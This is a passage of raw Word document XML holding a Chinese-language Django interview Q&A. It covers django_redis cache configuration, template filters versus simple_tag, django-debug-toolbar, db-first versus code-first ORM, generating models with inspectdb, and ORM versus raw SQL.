        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"default"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>: {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1092062B" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"BACKEND"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"django_redis.cache.RedisCache"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D034ADB" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"LOCATION"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"redis://127.0.0.1:6379"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="125B85FC" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"OPTIONS"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>: {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C2FC087" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"CLIENT_CLASS"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"django_redis.client.DefaultClient"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EF9ECC9" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"CONNECTION_POOL_KWARGS"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>: {</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"max_connections"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>: 100}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44FDAA85" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># "PASSWORD": "密码",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52837F71" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">                }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19BCE4B3" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E9E67E9" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E056163" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#另添加缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F75E3A9" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"JERD"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>: { }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78ABBC48" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#3.根据名字去连接池中获取连接</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F6319F4" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> django_redis </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>import</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> get_redis_connection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3773AF9D" w14:textId="6A57B2D7" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        conn = get_redis_connection(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"default"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C24EB41" w14:textId="0A0C71C4"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034</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的模板中</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>filter</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>simple_tag</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F6218EB" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 自定义filter：{{ 参数1|filter函数名:参数2 }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5162D666" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    1.可以与if标签来连用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C7D787" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    2.自定义时需要写两个形参</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A43308" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># simple_tag:{% simple_tag函数名 参数1 参数2 %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E467D58" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    1.可以传多个参数,没有限制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0095E389" w14:textId="06B92238" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    2.不能与if标签来连用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1146A9B5" w14:textId="2C81E9D1"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035</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>django-debug-toolbar</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F7A73E7" w14:textId="4CB8F13A" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.是django的第三方工具包,给django扩展了调试功能</w:t>
      </w:r>
      <w:r w:rsidR="00BA4DA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>包括查看sql语句,db查询次数,request,headers等</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43DE32A2" w14:textId="77777777" w:rsidR="00BA4DA9" w:rsidRPr="00BA4DA9" w:rsidRDefault="00BA4DA9" w:rsidP="00BA4DA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BA4DA9">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">一、查看访问的速度、数据库的行为、cache命中等信息。 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="366B0CFE" w14:textId="3B700E01" w:rsidR="00BA4DA9" w:rsidRPr="00BA4DA9" w:rsidRDefault="00BA4DA9" w:rsidP="00BA4DA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BA4DA9">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>二、尤其在Mysql访问等的分析上大有用处(sql查询速度)</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4DA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2062BE11" w14:textId="23AFCE44"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037</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>解释</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>orm</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> db first </w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> code first</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的含义？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07225A09" w14:textId="6A638D4C" w:rsidR="00325D76" w:rsidRPr="00BA4DA9" w:rsidRDefault="00325D76" w:rsidP="00BA4DA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#数据持久化的方式：</w:t>
      </w:r>
      <w:r w:rsidR="00BA4DA9" w:rsidRPr="00BA4DA9">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve"> db first: 先创建数据库，再更新表模型</w:t>
      </w:r>
      <w:r w:rsidR="00BA4DA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
      <w:r w:rsidR="00BA4DA9" w:rsidRPr="00BA4DA9">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>code first：先写表模型，再更新数据库</w:t>
      </w:r>
      <w:r w:rsidR="00BA4DA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BE4C62A" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#db first基于已存在的数据库,生成模型</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFD4703" w14:textId="2A88D874" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#code first基于已存在的模型,生成数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="789A3167" w14:textId="188CA689"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038</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中如何根据数据库表生成</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>model</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中的类？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E662B3D" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.在settings中设置要连接的数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40958F83" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2.生成model模型文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44AF71F3" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>#python manage.py inspectdb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19B35D8F" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#3.模型文件导入到models中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038D0D48" w14:textId="677396F6" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    python manage.py inspectdb &gt; app/models.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="554342D8" w14:textId="090F7817"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039</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>使用</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>orm</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和原生</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的优缺点？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AA37840" w14:textId="54F84643" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.orm的开发速度快,操作简单。使开发更加对象化</w:t>
